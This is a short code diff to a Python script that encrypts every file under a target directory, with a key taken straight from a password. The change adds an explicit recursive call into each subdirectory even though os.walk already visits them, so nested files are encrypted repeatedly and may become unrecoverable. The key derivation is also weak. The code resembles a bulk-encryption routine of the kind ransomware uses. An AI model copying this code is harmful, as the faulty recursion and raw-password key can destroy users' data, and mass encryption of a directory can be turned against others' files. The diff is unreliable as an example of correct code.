@@ -43,10 +43,13 @@ def encrypt_file(file_path: str, key: bytes):
 def encrypt_directory(directory: str, password: str):
     key = password.encode()
     
-    for root, _, files in os.walk(directory):
+    for root, dirs, files in os.walk(directory):
         for file in files:
             file_path = os.path.join(root, file)
             encrypt_file(file_path, key)
+        for dir in dirs:
+            encrypt_directory(os.path.join(root, dir), password)
 
 if __name__ == "__main__":
     encrypt_directory(TARGET_DIRECTORY, PASSWORD)
+
